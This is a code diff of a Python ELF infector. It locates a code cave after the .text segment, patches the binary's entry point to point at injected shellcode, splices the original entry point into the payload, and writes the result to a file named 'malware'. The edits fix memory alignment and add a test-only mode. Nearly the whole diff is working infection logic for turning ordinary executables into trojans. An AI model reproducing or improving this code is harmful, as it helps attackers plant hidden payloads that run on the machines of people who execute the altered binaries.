@@ -105,11 +105,16 @@ def locate_codecave(load_sections,payload_sz):
     # initialize arbitrarily large gap for initial comparison
     gap = 0xffffffff
 
+    # calculate the next offset to be 16 byte aligned
+    # ex. 0x40000 vice 0x3fffff
+    mem_align = text_end + (16 - (text_end & 0xf))
+    log.debug("code cave alignment is: %x" % mem_align)
+
     # calculate distance between .text and next closest section
     # save the lowest gap size as long as it is greater than 0
     for section in load_sections:
 
-        text_dist = section.p_offset - text_end
+        text_dist = section.p_offset - mem_align
         if text_dist < gap and text_dist > 0:
 
             log.debug("Found LOAD segment close to .text (offset: %x)" % section.p_offset)
@@ -127,17 +132,20 @@ def locate_codecave(load_sections,payload_sz):
 
     return text_seg
 
-def inject_shellcode(elf,txt_segment,payload):
+def inject_shellcode(elf,txt_segment,payload,args):
 
     global target_file
 
     # calculate location to inject payload
-    cave_offset = txt_segment.p_offset + txt_segment.p_filesz
+    mem_align = txt_segment.p_filesz + (16 - (txt_segment.p_filesz & 0xf))
+    cave_offset = txt_segment.p_offset + mem_align
+    cave_entry  = txt_segment.p_vaddr + mem_align
     log.debug("cave offset at: %x" % cave_offset)
+    log.debug("cave memory load offset at: %x" % cave_entry)
 
     # rebuild payload with the target binary's previous entry point
     #shellcode = payload[:0xe] + struct.pack("<I",elf.e_entry) + payload[0x12:]
-    shellcode = payload[:0x1] + struct.pack("<I",elf.e_entry) + payload[0x5:]
+    shellcode = payload[:0xe] + struct.pack("<I",elf.e_entry) + payload[0x12:]
 
     log.debug("New payload size is: %d" % len(shellcode))
 
@@ -146,21 +154,24 @@ def inject_shellcode(elf,txt_segment,payload):
         data = f.read()
 
     # change the binary entry point to hold the address of the injected shellcode
-    data = data[:0x18] + struct.pack("<I",cave_offset) + data[0x1c:]
+    data = data[:0x18] + struct.pack("<I",cave_entry) + data[0x1c:]
 
     # Insert our shellcode into the data
     data = data[:cave_offset] + shellcode + data[(cave_offset + len(shellcode)):]
 
-    with open("test_shellcode","wb") as f:
-        f.write(shellcode)
-    log.debug("Test shell code successfully generated.")
+    if args.test:
+        with open("test_shellcode","wb") as f:
+            f.write(shellcode)
+        log.debug("Test shell code successfully generated.")
 
-    # write to new file
-    with open("malware","wb") as f:
-        f.write(data)
+    else:
 
-    log.info("Shellcode successfully injected into: %s" % target_file)
+        # write to new file
+        with open("malware","wb") as f:
+            f.write(data)
     
+        log.info("Shellcode successfully injected into: %s" % target_file)
+        
 
 def shellcode(payload):
     '''Dynamically determine the entry point for the payload
@@ -187,6 +198,7 @@ def file_check(file_name):
     if path.exists(file_name):
         return file_name
     else:
+        print("failiing in file check.")
         print("Failed to open file.")
         sys.exit()
 
@@ -204,6 +216,8 @@ def args():
             help="Locate code cave offsets in provided file")
     parser.add_argument("-i", dest="implant", action="store_true",
             help="Implant shellcode into code cave.")
+    parser.add_argument("-t", dest="test", action="store_true",
+            help="Test building the new shellcode. Do not actually inject.")
     parser.add_argument("-v", dest="verbose", action="store_true",
             help="Enable verbose logging.")
     parser.add_argument("-s", dest="silent", action="store_true",
@@ -243,13 +257,13 @@ if __name__ == '__main__':
         code = shellcode("shellcode")
 
     # locate offsets and implant if possible and indicated at the commandline
-    if args.locate:
+    if args.locate or args.implant or args.test:
         log.info("Attempting to locate code cave in file: %s" % args.file)
 
         text_segment = locate_codecave(load_sections,len(code))
 
-        if args.implant:
-            inject_shellcode(elf,text_segment,code)
+        if args.implant or args.test:
+            inject_shellcode(elf,text_segment,code,args)
 
 
 
